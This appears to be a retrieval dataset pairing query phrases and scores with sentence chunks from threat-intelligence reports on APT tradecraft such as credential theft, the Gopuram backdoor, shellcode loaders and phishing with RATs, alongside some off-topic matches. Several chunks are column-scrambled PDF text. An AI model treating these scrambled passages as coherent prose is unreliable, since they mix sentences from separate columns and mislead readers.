the threat actor was running tasklist remotely on these systems specifically to see which of the target systems was running Google Chrome.|0.8739938561376978|['Remote Tasklist The threat actor attempted to remotely list running processes on systems using tasklist.exe .', 'As tasklist uses WMI under the hood, this activity was captured by Falcon as SuspiciousWmiQuery events that included the query and the source system.', 'Additionally, the failed (not successful) process listing resulted in a DCOM error that was logged in the System.evtx event log under Event ID 10028.', 'A sample of the information included with this event is below: 12/21Figure 9.', 'Event ID 10028 showing failed execution of remote tasklist This remote process listing was consistently used by the threat actor targeting the same or similar lists of remote systems, and the owners of the targeted systems also happened to be the individuals with cloud access that the threat actor was interested in.', 'While unproven, its possible the threat actor was running tasklist remotely on these systems specifically to see which of the target systems was running Google Chrome.', 'This is because a current or recent Chrome session to the victims cloud tenants would be potentially beneficial in the hijacking of sessions that the threat actor performed in order to access the victims cloud resources.', 'FTP Scanning/Identity Knowledge In one instance, after being evicted from a victim environment, the threat actor began probing external services as a means to regain access, initially focusing on (S)FTP servers that were internet-accessible.', 'Logs on the servers indicated that the threat actor attempted to log in with multiple valid accounts and in several cases was successful.', 'There was little to no activity during the (S)FTP sessions.', 'This likely was an exercise in attempting to identify misconfigured (S)FTP accounts that also had shell access, similar to whats described in the Credential Hopping section earlier.']
the script executed by the threat actor was heavily obfuscated and encrypted the output using AES256.|0.819688236397526|['Credential Refresh On some investigations, the dwell time of the threat actor spanned years.', 'Given this extended period, it is logical to assume that some credentials obtained by the threat actor would be rotated during normal business operations.', 'To combat this, the threat actor periodically refreshed their credential set by performing credential theft activities in an already compromised environment.', 'At one victim, CrowdStrike identified multiple instances of domain credential theft months apart, each time with a different credential theft technique.', 'One of the credential theft techniques identified by CrowdStrike was the use of a PowerShell script to execute Mimikatz in-memory.', 'While in-memory Mimikatz is not particularly unique, the script executed by the threat actor was heavily obfuscated and encrypted the output using AES256.', 'CrowdStrike was able to reconstruct the PowerShell script from the PowerShell Operational event log as the scripts execution was logged automatically due to the use of specific keywords.', 'CrowdStrike recommends that organizations upgrade PowerShell on their systems, as this functionality is only available with PowerShell version 5 and above.', 'In addition to refreshing the threat actors credentials, the threat actor would also refresh their understanding of the victims AD environment.', 'Around the time when the threat actor executed Get-ADReplAccount , the threat actor also executed a renamed version of AdFind to output domain reconnaissance information.', 'In this instance, AdFind was renamed to masquerade as a legitimate Windows binary.']
the script executed by the threat actor was heavily obfuscated and encrypted the output using AES256.|0.819688236397526|['Credential Refresh On some investigations, the dwell time of the threat actor spanned years.', 'Given this extended period, it is logical to assume that some credentials obtained by the threat actor would be rotated during normal business operations.', 'To combat this, the threat actor periodically refreshed their credential set by performing credential theft activities in an already compromised environment.', 'At one victim, CrowdStrike identified multiple instances of domain credential theft months apart, each time with a different credential theft technique.', 'One of the credential theft techniques identified by CrowdStrike was the use of a PowerShell script to execute Mimikatz in-memory.', 'While in-memory Mimikatz is not particularly unique, the script executed by the threat actor was heavily obfuscated and encrypted the output using AES256.', 'CrowdStrike was able to reconstruct the PowerShell script from the PowerShell Operational event log as the scripts execution was logged automatically due to the use of specific keywords.', 'CrowdStrike recommends that organizations upgrade PowerShell on their systems, as this functionality is only available with PowerShell version 5 and above.', 'In addition to refreshing the threat actors credentials, the threat actor would also refresh their understanding of the victims AD environment.', 'Around the time when the threat actor executed Get-ADReplAccount , the threat actor also executed a renamed version of AdFind to output domain reconnaissance information.', 'In this instance, AdFind was renamed to masquerade as a legitimate Windows binary.']
the script executed by the threat actor was heavily obfuscated and encrypted the output using AES256.|0.819688236397526|['This was necessary, as the threat actor was targeting multiple domains.', 'The resulting output of each command was redirected to a text file and compressed as zip archives before exfiltration.The fact thatGet-ADReplAccountcommand includes not only the current NTLM hashes but also the hash history (i.e., hashes of previous passwords used by a user account) meant that the threat actor also had the ability to discover accounts that either reused the same passwords or used similar passwords when the account password was changed.Credential RefreshOn some investigations, the dwell time of the threat actor spanned years.', 'Given this extended period, it is logical to assume that some credentials obtained by the threat actor would be rotated during normal business operations.', 'To combat this, the threat actor periodically refreshed their credential set by performing credential theft activities in an already compromised environment.', 'At one victim, CrowdStrike identified multiple instances of domain credential theft months apart, each time with a different credential theft technique.One of the credential theft techniques identified by CrowdStrike was the use of a PowerShell script to execute Mimikatz in-memory.', 'While in-memory Mimikatz is not particularly unique, the script executed by the threat actor was heavily obfuscated and encrypted the output using AES256.', 'CrowdStrike was able to reconstruct the PowerShell script from the PowerShell Operational event log as the scripts execution was logged automatically due to the use of specific keywords.', 'CrowdStrike recommends that organizations upgrade PowerShell on their systems, as this functionality is only available with PowerShell version 5 and above.In addition to refreshing the threat actors credentials, the threat actor would also refresh their understanding of the victims AD environment.', 'Around the time when the threat actor executedGet-ADReplAccount, the threat actor also executed a renamed version of AdFind to output domain reconnaissance information.', 'In this instance, AdFind was renamed to masquerade as a legitimate Windows binary.', 'The usage of renamed AdFind is consistent with other industry reporting on this campaign.In addition to using scripted commands, operators were repeatedly observed manually executing several standard PowerShell cmdlets to enumerate network information from AD, includingGet-ADUserandGet-ADGroupMemberto query specific members in the directory.']
decrypt the payload|0.7940226806218007|"['The execution of StealthMutant through InstallUtil.exe InstallUtil.exe is a legitimate installer application under Microsofts .NET Framework, but it is also known as a living-off-the-land binary (LOLBin) that is used in the proxy execution of .NET Framework programs.', 'In a scheduled task, InstallUtil.exe is registered to run StealthMutant, as demonstrated in Figure 11.', 'Figure 11.', 'InstallUtil.exe being registered to run StealthMutant via a scheduled task 10 | Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and BackdoorTechnical Analysis of the Loaders Earth Bakus new campaign takes advantage of the various capabilities of two shellcode loaders, StealthMutant and StealthVector.', 'StealthMutant StealthMutant is an evasive shellcode loader written in C# that has been in use since at least July 2020.', 'It reads a file that is encrypted by AES-256-ECB, decrypts the file in memory, injects its malicious payload into a remote process, and then executes it.', 'We have observed that its payload has been either the Cobalt Strike beacon or the ScrambleCross backdoor.', 'Most of the StealthMutant samples we have come across are obfuscated by ConfuserEx, an open-source obfuscator for .NET Framework applications.', 'After deobfuscating these samples, we have observed raw namespaces and classes that describe their purpose (Figure 12).', 'Figure 12.', 'The namespaces and classes from the deobfuscated samples 11 | Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and BackdoorAll the strings in StealthMutant are encrypted with the encryption algorithm AES-256-ECB and are decrypted on the spot, as shown in Figure 13.']"
DLLs with the names ualapi.dll and ncobjapi.dll being sideloaded|0.7679681891628698|['During the investigation, we found that Gopuram coexisted on victim machines with AppleJeus, a backdoor attributed to the Korean-speaking threat actor Lazarus.', 'Over the years, we observed few victims compromised with Gopuram, but the number of infections began to increase in March 2023.', 'As it turned out, the increase was directly related to the 3CX supply chain attack.', 'We found out that the threat actor specifically targeted cryptocurrency companies, dropping the following files on infected machines: C:\\\\Windows\\\\system32\\\\wlbsctrl.dll, a malicious library (MD5: 9f85a07d4b4abff82ca18d990f062a84); C:\\\\Windows\\\\System32\\\\config\\\\TxR\\\\<machine hardware profile GUID>.TxR.0.regtrans-ms, an encrypted shellcode payload.', 'Once dropped, wlbsctrl.dll becomes loaded on every startup by the IKEEXT service via DLL hijacking.', 'We further saw DLLs with the names ualapi.dll and ncobjapi.dll being sideloaded into spoolsv.exe and WmiPrvSE.exe, respectively.', 'The wlbsctrl.dll library is responsible for decrypting and executing the shellcode stored in the C:\\\\Windows\\\\System32\\\\config\\\\TxR directory.', 'The decryption is notably performed through the CryptUnprotectData API function that uses a different encryption key internally on every machine.', 'This makes it difficult for researchers to decrypt the payload from the file without physical access to the victim machines.', '2/5Snippet of the loading function using CryptUnprotectData The component loaded by the library is Gopurams main module.', 'As mentioned above, its name in the export directory is guard64.dll.']
collects system information and browser history, then sends it to the C2 server.|0.903488808331653|['The following has been discovered so far: The infection is spread via 3CXDesktopApp MSI installers.', 'An installer for macOS has also been trojanized.', 'The malicious installation package contains an infected dll library that decrypts a shellcode from the d3dcompiler_47.dll librarys overlay and executes it.', 'The decrypted payload extracts C2 server URLs from icons stored in a GitHub repository (the repository is removed).', 'The payload connects to one of the C2 servers, downloads an infostealer and starts it.', 'The infostealer collects system information and browser history, then sends it to the C2 server.', '1/5As we reviewed available reports on the 3CX attack, we began wondering if the compromise concluded with the infostealer or further implants followed.', 'To answer that question, we decided to review the telemetry we had on the campaign.', 'On one of the machines, we observed a DLL named guard64.dll, which was loaded into the infected 3CXDesktopApp.exe process.', 'Interestingly enough, we opened an investigation into a case linked to that DLL on March 21, about a week before the supply chain attack was discovered.', 'A DLL with that name was used in recent deployments of a backdoor that we dubbed Gopuram and had been tracking internally since 2020.']
Performs payload injections through syscalls via mapping a shellcode to a remote process and creating a remote thread.|0.9600099786919374|['We have observed eight modules so far: Module name Description Ping Pings a host specified in the argument.', 'Connects to a given host via a socket and waits for the server to Connect send data.', 'Registry Manipulates registry (lists, adds, deletes and exports keys).', 'Service Manipulates (creates, lists, starts, stops and deletes) services.', 'Timestomp Performs timestomping on files.', 'Performs payload injections through syscalls via mapping a Inject shellcode to a remote process and creating a remote thread.', 'Kernel Driver Utility that allows an attacker to bypass driver signature enforcement.', 'The utility is used to load an unsigned driver KDU (MD5: F684E10FF1FFCDD32C62E73A11382896).', 'The driver collects information about installed AV filters and writes it to the C:\\\\Windows\\\\System32\\\\catroot2\\\\edb.chk.log file.', 'Encrypts a provided payload and writes it to the Update C:\\\\Windows\\\\System32\\\\config\\\\TxR\\\\<machine hardware profile GUID>.TxR.0.regtrans-ms file.', 'Partially implements features of the net command: management of Net users, groups, sessions and network shares.']
Connects to a given host via a socket and waits for the server to send data.|0.9545453217638962|['The job of the main module is to connect to a C2 server and request commands.', 'The backdoor implements commands that allow the attackers to interact with the victims file system and create processes on the infected machine.', 'Gopuram was additionally observed to launch in- memory modules.', 'Just like the implants used in the 3CX campaign, Gopurams modules are DLL files that include an export function named DllGetClassObject.', 'We have observed eight modules so far: Module name Description Ping Pings a host specified in the argument.', 'Connects to a given host via a socket and waits for the server to Connect send data.', 'Registry Manipulates registry (lists, adds, deletes and exports keys).', 'Service Manipulates (creates, lists, starts, stops and deletes) services.', 'Timestomp Performs timestomping on files.', 'Performs payload injections through syscalls via mapping a Inject shellcode to a remote process and creating a remote thread.', 'Kernel Driver Utility that allows an attacker to bypass driver signature enforcement.']
Manipulates (creates, lists, starts, stops and deletes) services.|0.9715881612765864|['Gopuram was additionally observed to launch in- memory modules.', 'Just like the implants used in the 3CX campaign, Gopurams modules are DLL files that include an export function named DllGetClassObject.', 'We have observed eight modules so far: Module name Description Ping Pings a host specified in the argument.', 'Connects to a given host via a socket and waits for the server to Connect send data.', 'Registry Manipulates registry (lists, adds, deletes and exports keys).', 'Service Manipulates (creates, lists, starts, stops and deletes) services.', 'Timestomp Performs timestomping on files.', 'Performs payload injections through syscalls via mapping a Inject shellcode to a remote process and creating a remote thread.', 'Kernel Driver Utility that allows an attacker to bypass driver signature enforcement.', 'The utility is used to load an unsigned driver KDU (MD5: F684E10FF1FFCDD32C62E73A11382896).', 'The driver collects information about installed AV filters and writes it to the C:\\\\Windows\\\\System32\\\\catroot2\\\\edb.chk.log file.']
user|1.0|"['Using an account that has Microsoft 365 Global Administrator permissions, invalidate each existing accounts refresh token using the PowerShell commands noted in Figure 30.', 'Connect-AzureAD Get-AzureADuser -Identity <UPN> | Revoke-AzureADUserAllRefreshToken FIGURE 30.', 'PowerShell commands to connect to Azure AD and revoke existing refresh tokens.MANDIANT Remediation and Hardening Strategies for Microsoft 365 to Defend Against APT29 28 Attack Technique: Hijack Azure AD Applications Azure Applications and Service Principals Overview Applications are created in Azure AD to provide API access to There are two different models when assigning permissions for Microsoft 365 data by third parties.', 'Different terms are used to applications to access an API: refer to applications depending on how they are created and Delegated Permissions, also known as how they are interacted with.', 'This section defines these terms OAuth2PermissionGrants, enable an application to perform before a discussion of the threat actor techniques and how to API operations that access or manipulate data on behalf of a protect against them.', 'signed-in user.', 'A user must sign-in and consent to, or allow, App Registrations, also known as Applications or Application the application to access data on their behalf.', 'An administrator Objects, define the initial instance of an application, including can also consent on the behalf of all users.', 'Delegated API permissions, application secrets, and branding elements.', 'permissions are out of scope for this white paper.', 'The app registration resides in the tenant where it was Application Permissions, also known as AppRoles and created.']"
user|0.8012192821327059|['in the devices hardware or circuit board.', 'with unsecured code, creating significant and OT devices.', 'In addition, some devices have The solution is partnership.', 'Together with Over the past few years, we have seen vulnerabilities which can be exploited to take firmware that is not cryptographically signed, suppliers and global governments, Microsoft increased targeting of firmware to launch over the device or inject malicious code into enabling them to be updated without verification is committed to addressing security across our devastating attacks.', 'As firmware is likely to the firmware.', 'from the user.', 'These weaknesses further open the supply chain ecosystem, exceeding demands continue to be a valuable target for threat devices up to supply chain attacks throughout This risk is compounded when it comes to from customers and regulators alike.', 'To do actors, organizations must protect against the supply chain.', 'Most devices are built using the production and distribution chain.', 'this, we are driving a comprehensive approach firmware hacking.', 'software and hardware components from To address these threats, Microsoft invests to security and operational resiliency that is numerous manufacturers as well as open- significantly in ensuring the security and integrity flexibly deployed across the supply chain.']
user|0.8164646010537093|['Her the accounts last-known trusted device or question its dominance.', 'In the security measures had a critical flaw, or IP.)', 'jargon of political philosophy, this because they utterly depended on her She personally had never activated utter domination (to the point of having access to the physical device.', 'A 2FA on the Google account (it seems unconsciousness) is called hegemony.', 'bureaucratic rigmarole with her cellular inappropriate to say her account at provider ultimately concluded in her this point).', 'But, because of changes in The banalization of spyware, as getting a kiosk clerk to perform for the infosec landscape (both at Google marked by the terms departure her the equivalent of a SIM swap: thus, and in general) in the intervening years from the public discourse, is a prime proving that Any adversary could have UNREDACTED MAGAZINE / Q1 2023 16(e.g., the legacy of the 2010 Operation on or off without your knowledge, is still assumed by the user.', 'Because, Aurora hack), as well as Googles but it provides hyperlinks only once just imagine, statistically, how many amalgamation of all its services like again back to the basic Two-step unrecovered accounts must exist, some Gmail and YouTube under one general verification info page.', 'subset of which have expired domains.', 'Google account circa 2015, Google And some subset of those accounts by now had unilaterally imposed a Finally, of course, there isnt any will have weak passwords, or will have stricter security policy onto all of its readily available Google customer usernames and passwords that match user accounts.', 'In the intervening years, service to speak of.', 'Its just an endless up to breached account datasets from Google had probably at some point labyrinth of more DIY steps and some other service.']
user|1.0|"[""12.29 Separation Logical access Access to the It is possible to 3 of logical will be limited, management verify the system's approach to the extent systems will be manufacturer possible, limited according whether the system (functional) to to user profiles."", 'can use different the production system controller user profiles.', 'systems, will not change including settings and control parameters of.', 'interfaces, system.', 'Changing sample the parameters will interfaces and be carried out by human-machine an administrative interfaces.', 'user.', '- UNCLASSIFIED - 55Control Title The Control Complementary Control Control ID explanation Implementation Depth* Example 12.30 Robustness Carry out The organization Can be realized 2 tests information will define by checking the security comprehensive configuration of testing in the tests, outline for the environment, production and tests including running simulations management the variety of during downtime environments control network windows and and interface, components, with performing including an emphasis on penetration tests penetration comprehensive in these networks tests.', 'information if possible and.', 'or security tests for during maintenance all components, in operations.', 'order to maintain the continuity of the business process.', '12.31 Information Set up unique The organization Network monitoring 2 Security monitoring will define in control networks Monitoring scenarios in a variety of is different from the production dedicated ordinary systems environment monitoring monitoring since and monitor scenarios for the sensitivity them the control threshold is lower.']"
attached to spearphishing emails|0.7751057589267067|"['However, Gamaredon remained the most active from criminal and nation-state-directed cyberattacks.', 'Comprehensive aligned threat actors, GALLIUM probably exploited weaknesses in group in Ukraine, significantly enhancing its data-collecting capabilities descriptions of activities described in this document were therefore Microsoft Exchange servers or IIS servers, extending its targeting from by redeveloping existing tools and deploying new ones.', 'previously provided exclusively to our premium customers.', 'More telecommunications operators to government organizations around information about ESET APT Reports PREMIUM and its delivery of the world; MirrorFace probably exploited vulnerabilities in the Proself North Korea-aligned groups continued to focus on Japan, South high-quality, strategic, actionable, and tactical cybersecurity threat online storage service; and TA410 probably exploited flaws in the Adobe Korea, and South Korea-focused entities, employing carefully crafted intelligence is available at the ESET Threat Intelligence page.', 'ColdFusion application server.', 'spearphishing emails.', 'The most active Lazarus scheme observed was Operation DreamJob, luring targets with fake job offers for lucrative ESET products protect our customers systems from the malicious Iran- and Middle East-aligned groups continued to operate at positions.', 'This group consistently demonstrated its capability to create activities described in this report.', 'Intelligence shared here is based high volume, primarily focusing on espionage and data theft from malware for all major desktop platforms.', 'Finally, our researchers mostly on proprietary ESET telemetry data and has been verified by organizations in Israel.', 'Notably, Iran-aligned MuddyWater also targeted uncovered the operations of three previously unidentified China-aligned ESET researchers.ESET APT ACTIVITY REPORT Executive summary Targeted countries and verticals China India Iran Middle East North Korea Russia Other About ESET APRIL - SEPTEMBER | 4 Targeted countries and verticals TARGETED COUNTRIES AND REGIONS TARGETED BUSINESS VERTICALS Armenia Pakistan Bangladesh Philippines Gambling companies and their customers Central Asia Poland Governmental organizations and entities China Saudi Arabia Hosting providers Czechia Serbia Industrial networks European Union Slovakia IT companies French Polynesia South Korea Local governments and institutions Greece Tajikistan Media organizations Guyana Trkiye (aka Turkey) Political entities Hong Kong Ukraine Private companies Israel United Arab Emirates Scholars and journalists specializing in North Korea Japan United States Research institutes Kuwait Uyghurs and other Turkic ethnic minorities Telecommunication operators Mali UniversitiesESET APT ACTIVITY REPORT Executive summary Targeted countries and verticals China India Iran Middle East North Korea Russia Other About ESET APRIL - SEPTEMBER 2023 | 5 ChinaESET APT ACTIVITY REPORT Executive summary Targeted countries and verticals China India Iran Middle East North Korea Russia Other About ESET APRIL - SEPTEMBER 2023 | 6 Mustang Panda FishMonger TA410 GREF MirrorFace GALLIUM DigitalRecyclers TheWizards PerplexedGoblin Worok Summary of China-aligned APT group activity seen by ESET Research in April 2023 September 2023 During the past six months, ESET researchers continued to observe several Targets first received a spearphishing email with a tracking pixel, enabling box (see Figure 1) and if the visitor clicks on OK, a Windows executable is China-aligned APT groups targeting European government organizations, the attacker to know when the target opens the email.']"
Exfiltration over C2 channel|0.7507577274301187|['Discovery The shellcode downloader chain checks running processes for a security solution.', 'Data from Local Deadglyph has a module for reading Collection T1005 System files.', 'Application Layer Deadglyph and the shellcode T1071.001 Protocol: Web downloader communicate with the Protocols C&C server via the HTTP protocol.', 'Deadglyph and the shellcode Command T1090 Proxy downloader can use HTTP proxy for and Control C&C communication.', 'Encrypted Channel: Deadglyph uses AES to encrypt C&C T1573.001 Symmetric communications.', 'Cryptography Exfiltration Over C2 Deadglyph uses the C&C channel for Exfiltration T1041 Channel exfiltration.', '11/11']
Exfiltration over C2 channel|0.7834499168665914|"['Defense Evasion Malicious updates shipped as ""trident"" bundles will perform DLL T1574.002 Hijack Execution Flow: DLL Side-Loading side loading.', 'Some of the final payloads such as PoisonIvy and Gh0st RAT Collection T1056.001 Input Capture:Keylogging have keylogging capabilities.', 'The PoisonIvy final payload variant has capabilities to T1090.001 Proxy: Internal Proxy authenticate with proxies.', 'Command and All malicious update instances communicate over raw TCP or T1095 Non-Application Layer Protocol Control UDP.', 'Both PosionIvy and Gh0st RAT use encrypted TCP T1573 Encrypted Channel communication to avoid detection.', 'Exfiltration in all malicious updates instances is done over a Exfiltration T1041 Exfiltration Over C2 Channel Command and Control channel.', 'Ignacio Sanmillan 1 Feb 2021 - 11:30AM Newsletter Email...', ""Submit Similar Articles CYBERCRIME MALWARE MALWARE MALWARE Emotet botnet disrupted in global Vadokrist: A wolf in sheep's Operation Spalax: Targeted 7 ways malware can get into your operation clothing malware attacks in Colombia device Discussion Home Sitemap Research RSS Configurator About Us Our Experts How To News Widget Contact Us ESET CategoriesPrivacy policy Legal Information Copyright ESET, All Rights Reserved""]"
Exfiltration over C2 channel|0.7841485113210257|['Command and T1071.001 Application Layer Protocol: Web Protocols Control The attacker uses web protocols to download additional tools, exfiltrate data and operate the malware.', 'T1132.001 Data Encoding: Standard Encoding The data is encoded using compression with a password.', 'T1090.001 Proxy: Internal Proxy The attacker uses netcat and Stowaway-Node to create tunnels inside the victim network.', 'T1090.002 Proxy: External Proxy The attacker uses netcat and Stowaway-Node to create tunnels to the outside of the network.', 'Exfiltration T1020 Automated Exfiltration The attacker can automatically exfiltrate Office documents.', 'T1041 Exfiltration Over C2 Channel The attacker exfiltrates data over the C2 channel.', 'T1567.002 Exfiltration Over Web Service: Exfiltration to Cloud Storage The attacker exfiltrates data to Google Drive.', 'ATTACKS ON INDUSTRIAL CONTROL SYSTEMS 14 USING SHADOWPAD 2022 AO KASPERSKY LABKaspersky Industrial Control Systems Cyber Emergency Response Team (Kaspersky ICS CERT) is a global project of Kaspersky aimed at coordinating the efforts of automation system vendors, industrial facility owners and operators, and IT security researchers to protect industrial enterprises from cyberattacks.', 'Kaspersky ICS CERT devotes its efforts primarily to identifying potential and existing threats that target industrial automation systems and the industrial internet of things.', 'Kaspersky ICS CERT ics-cert@kaspersky.com ATTACKS ON INDUSTRIAL CONTROL SYSTEMS 15 USING SHADOWPAD 2022 AO KASPERSKY LAB']
Exfiltration over C2 channel|0.7632166957405194|['Discovery T1082 System Information SparrowDoor collects the username, Discovery computername, RDP session ID, and drive types in the system and sends this data to the C&C server.', 'T1083 File and Directory SparrowDoor can probe files in a specified Discovery directory obtaining their names, attributes, sizes and last modified times, and sends this data to the C&C server.', 'Collection T1005 Data from Local SparrowDoor has the ability to read file contents System and exfiltrate them to the C&C server.', 'Command T1071.001 Application Layer SparrowDoor communicates with the C&C server and Control Protocol: Web using the HTTPS protocol.', 'Protocols T1573.001 Encrypted Channel: SparrowDoor encrypts/decrypts communications Symmetric with its C&C server using different multi-byte XOR Cryptography keys.', 'Exfiltration T1041 Exfiltration Over C2 SparrowDoor exfiltrates data over its C&C Channel channel.', 'https://www.welivesecurity.com/2021/09/23/famoussparrow-suspicious-hotel-guest/ 12/12']
Exfiltration over C2 channel|0.7841485113210257|"['Command T1071.001 Application Layer Protocol: Web Protocols and Control The attacker uses web protocols to download additional tools, exfiltrate data and operate the malware.', 'T1132.001 Data Encoding: Standard Encoding The data is encoded using compression with a password.', 'T1090.001 Proxy: Internal Proxy The attacker uses netcat and Stowaway-Node to create tunnels inside the victim network.', 'T1090.002 Proxy: External Proxy The attacker uses netcat and Stowaway-Node to create tunnels to the outside of the network.', 'Exfiltration T1020 Automated Exfiltration The attacker can automatically exfiltrate Office documents.', 'T1041 Exfiltration Over C2 Channel The attacker exfiltrates data over the C2 channel.', 'T1567.002 Exfiltration Over Web Service: Exfiltration to Cloud Storage The attacker exfiltrates data to Google Drive.', 'https://ics-cert.kaspersky.com/publications/reports/2022/06/27/attacks-on-industrial-control-systems-using-shadowpad/ 13/146/28/22, 5:07 PM Attacks on industrial control systems using ShadowPad | Kaspersky ICS CERT Authors Artem Snegirev Security Researcher, Kaspersky ICS CERT Kirill Kruglov Senior Research Developer, Kaspersky ICS CERT https://ics-cert.kaspersky.com/publications/reports/2022/06/27/attacks-on-industrial-control-systems-using-shadowpad/ 14/14']"
encryption|0.8347460613760463|"['But the number of representational possibilities available to a quantum computer expands exponentially (three qubits have 2^3, or eight states, four qubits have 2^4, or 16 states, etc.).', 'And thats just the start.', 'Qudits (the d representing a variable number of dimensions) take this concept even further.', 'In 2017, for example, scientists at the National Institute of Scientific Research constructed a pair of qudits with 10 different states each, providing more computational power than six qubits.', 'Compound that by millions of qubits (or qudits), and the potential computational power of a quantum computer seems limitless.', 'From a cybersecurity perspective, quantum computers will play a potentially devastating role in undermining the effectiveness of things like data encryption.', 'Quantum computers will quickly render asymmetric encryption algorithms obsolete.', '(These are the algorithms used to sign information to ensure data integrity, perform key exchanges to enable confidentiality algorithms to scramble data, and to verify authenticity of people or data.)', 'In fact, it is being predicted that quantum computers will break elliptical curve cryptography by 2027.', '6WHITE PAPER | Cyber Threat Predictions for 2021 Of course, quantum computers are not currently commercially available, at least not to the usual assortment of cyber criminals most organizations are concerned with.', 'However, they still have one colossal benefactornation-states.']"
encryption|0.8347460613760463|['Layering integrates people, technology, and operational capabilities to establish security barriers across multiple layers of the DODIN- A.', 'Various types of security barriers include Antivirus software.', 'Firewalls.', 'Anti-spam software.', 'Communications security.', 'Data encryption.', 'Password protection.', 'Physical and technical barriers.', 'Continuous security training.', 'Continuous network monitoring.', '2-8.']
encryption|1.0|['However, the data on any other drives is easily accessible.', 'cd ~/Downloads In the past, I have encouraged readers to create an encrypted VeraCrypt adb install com.anonyome.', 'container on the external drives and mysudo_1.8.0-13894_ store all data securely within it.', 'This is minAPI24(x86_64)(nodpi)_ still valid advice, but there are other apkmirror.com options.', 'Lately, I have been relying You should now see the MySudo on Linux Unified Key Setup (LUKS) for application within the Anbox emulator.', 'encryption.', 'From within Pop!_OS or However, I want a traditional program many other Linux builds, open the Disks icon within my applications menu.', 'I application, select the target drive, click executed the following within Terminal.', 'the settings icon, choose the Format Partition option, select the internal ln -s ~/snap/anbox/common/ Ext4 option, enable the Password app-data/applications/anbox protect volume feature, and assign ~/.local/share/applications/ a very secure password.', 'The entire anbox external drive is now encrypted.', 'The benefit is that you do not need third- I can now add the MySudo icon to party decryption software to access my Dock and execute a traditional your data.']
manually extract the file and execute it|0.7829354320513835|['These threat actors show perfect usage of the Spanish language in the emails they send, they only target Colombian entities, and they use premade malware and dont develop any themselves.', 'Attack overview Targets are approached with emails that lead to the download of malicious files.', 'In most cases, these emails have a PDF document attached, which contains a link that the user must click to download the malware.', 'The downloaded files are regular RAR archives that have an executable file inside.', 'These archives are hosted in legitimate file hosting services such as OneDrive or MediaFire.', 'The target has to manually extract the file and execute it for the malware to run.', 'Weve found a variety of packers used for these executables, but their purpose is always to have a remote access trojan running on the victimized computer, usually by decrypting the payload and injecting it into legitimate processes.', 'An overview of a typical attack is shown in Figure 1.', 'We have seen the attackers use three different RATs: Remcos, njRAT and AsyncRAT.', '1/15Figure 1.', 'Overview of the attack Phishing emails The attackers use various topics for their emails, but in most cases they are not specially crafted for their victims.']
have attempted to get users to execute malicious files masquerading as documents|0.760681564964003|['T1566.002 Phishing: Spearphishing The attackers have used emails with a link to download malware.', 'Link Execution T1059.005 Command and Scripting The attackers have used droppers that dump VBS files with Interpreter: Visual Basic commands to achieve persistence.', 'T1059.003 Command and Scripting The attackers have used RATs that can launch a command shell for Interpreter: Windows executing commands.', 'Command Shell T1106 Native API The attackers have used API calls in their droppers, such as CreateProcessA, WriteProcessMemory and ResumeThread, to load and execute shellcode in memory.', 'T1204.001 User Execution: Malicious The attackers have attempted to get users to open a malicious link Link that leads to the download of malware.', 'T1204.002 User Execution: Malicious The attackers have attempted to get users to execute malicious files File masquerading as documents.', 'Persistence T1547.001 Boot or Logon Initialization The attackers have used RATs that persist by creating a Run registry Scripts: Registry Run Keys / key or by creating a copy of the malware in the Startup folder.', 'Startup Folder T1053.005 Scheduled Task/Job: The attackers have used scheduled tasks in their droppers and Scheduled Task payloads to achieve persistence.', 'Privilege T1548.002 Abuse Elevation Control The attackers have used RATs that implement UAC bypassing.', 'Escalation Mechanism: Bypass User Access Control Defense T1140 Deobfuscate/Decode Files The attackers have used various encryption algorithms in their Evasion or Information droppers to hide strings and payloads.', 'T1562.001 Impair Defenses: Disable or The attackers have used CyaX packer, which can disable Windows Modify Tools Defender.']
regular RAR archives that have an executable file inside.|0.8948669957943439|['The attacks described in that article were connected to cybercrime, not espionage.', 'While we have not seen any payload delivered by the attackers other than RATs, some of the targets in the current campaign (such as a lottery agency) dont make much sense for spying activities.', 'These threat actors show perfect usage of the Spanish language in the emails they send, they only target Colombian entities, and they use premade malware and dont develop any themselves.', 'Attack overview Targets are approached with emails that lead to the download of malicious files.', 'In most cases, these emails have a PDF document attached, which contains a link that the user must click to download the malware.', 'The downloaded files are regular RAR archives that have an executable file inside.', 'These archives are hosted in legitimate file hosting services such as OneDrive or MediaFire.', 'The target has to manually extract the file and execute it for the malware to run.', 'Weve found a variety of packers used for these executables, but their purpose is always to have a remote access trojan running on the victimized computer, usually by decrypting the payload and injecting it into legitimate processes.', 'An overview of a typical attack is shown in Figure 1.', 'We have seen the attackers use three different RATs: Remcos, njRAT and AsyncRAT.']
regular RAR archives that have an executable file inside.|0.8948669957943439|['This also happened in the earlier campaign.However, there are differences in the attachments used for phishing emails, the remote access trojans (RATs) used and in most of the operators C&C infrastructure.There is alsothis report from Trend Micro, from July 2019.', 'There are similarities between the phishing emails and parts of the network infrastructure in that campaign and the one we describe here.', 'The attacks described in that article were connected to cybercrime, not espionage.', 'While we have not seen any payload delivered by the attackers other than RATs, some of the targets in the current campaign (such as a lottery agency) dont make much sense for spying activities.These threat actors show perfect usage of the Spanish language in the emails they send, they only target Colombian entities, and they use premade malware and dont develop any themselves.Attack overviewTargets are approached with emails that lead to the download of malicious files.', 'In most cases, these emails have a PDF document attached, which contains a link that the user must click to download the malware.', 'The downloaded files are regular RAR archives that have an executable file inside.', 'These archives are hosted in legitimate file hosting services such as OneDrive or MediaFire.', 'The target has to manually extract the file and execute it for the malware to run.Weve found a variety of packers used for these executables, but their purpose is always to have a remote access trojan running on the victimized computer, usually by decrypting the payload and injecting it into legitimate processes.', 'An overview of a typical attack is shown in Figure 1.', 'We have seen the attackers use three different RATs: Remcos, njRAT and AsyncRAT.Figure 1.', 'Overview of the attackPhishing emailsThe attackers use various topics for their emails, but in most cases they are not specially crafted for their victims.']
